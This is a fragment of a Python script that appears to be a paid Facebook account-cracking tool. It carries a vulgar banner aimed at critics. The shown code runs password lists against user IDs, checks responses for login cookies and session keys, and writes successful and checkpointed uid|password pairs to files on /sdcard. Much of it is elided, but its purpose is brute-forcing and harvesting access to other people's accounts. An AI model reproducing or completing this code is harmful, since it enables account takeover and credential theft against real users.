...
----------------------------------------------
 ...
 Tool type : PAID
----------------------------------------------
 For Haters: Tumhare Okat Nhi Meri Gand Marny ki 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [AKING-CP] '+ids+' | '+pas+'\033[1;31m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AKING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
